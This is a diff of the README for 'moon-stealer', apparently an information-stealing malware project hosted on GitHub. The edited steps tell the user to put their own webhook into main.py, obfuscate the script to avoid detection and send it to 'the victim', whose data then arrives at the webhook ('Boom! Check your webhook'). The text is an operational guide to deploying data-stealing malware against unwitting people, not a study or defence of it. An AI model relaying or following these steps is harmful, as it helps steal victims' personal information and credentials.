@@ -16,17 +16,19 @@
 
 1. [Download source code zip](https://github.com/Yuvi5001/moon-stealer/archive/refs/heads/main.zip)
 
-2. Extract zip
+2. Extract the zip
 
-3. Run `install_python.bat` if you don't have python installed.
+3. Run `install_python.bat` if you don't have python installed
 
-4. Open `main.py` with any text editor such as notepad.
+4. Open `main.py` with any text editor such as notepad
 
-5. Replace `X` with your webhook where it says `hook = "X"` inside of the `main.py` file.
+5. Replace `X` with your webhook where it says `hook = "X"` inside of the `main.py` file
 
 6. Obfuscate your code: [https://pyobfuscate.com/](https://pyobfuscate.com/pyd) (Recommended)
 
-7. Send `main.py` to the victim and when they run `main.py` you will have their info in the webhook you provided in step 5.
+7. Send `main.py` to the victim and when they run `main.py`
+ 
+8. Boom! Check your webhook.
 
 <a id="features"></a>
 
